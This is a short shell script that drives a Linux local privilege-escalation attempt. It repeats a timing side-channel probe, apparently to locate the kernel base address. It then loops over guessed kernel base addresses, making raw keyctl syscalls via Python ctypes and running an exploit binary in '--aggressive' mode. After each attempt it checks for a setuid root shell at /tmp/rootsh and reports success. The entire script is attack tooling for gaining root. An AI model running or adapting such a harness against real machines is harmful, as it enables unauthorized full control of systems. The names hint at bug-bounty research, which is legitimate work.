#!/bin/sh
cd /tmp/rt || exit 1
echo "=== avx_edge x3 (band stability) ==="
for i in 1 2 3; do ./avx_edge 3 2>&1 | grep "longest slow run"; done
echo "=== try RustyTux at band left edge ==="
for kb in 0xffffffffad600000 0xffffffffad200000 0xffffffffad400000; do
  echo "-- kbase=$kb --"
  for i in 1 2 3 4 5 6 7 8; do
    python3 -c "import ctypes;l=ctypes.CDLL(None);[l.syscall(250,7,ctypes.c_ulong(r)) for r in (-2,-3,-4,-5)]" 2>/dev/null
    BBH_KBASE=$kb timeout 60 ./e_def --aggressive --quiet >/dev/null 2>&1
    if [ -u /tmp/rootsh ]; then echo "ROOTED kbase=$kb attempt $i"; ls -la /tmp/rootsh; exit 0; fi
  done
  echo "  no root at $kb"
done
echo "DONE"
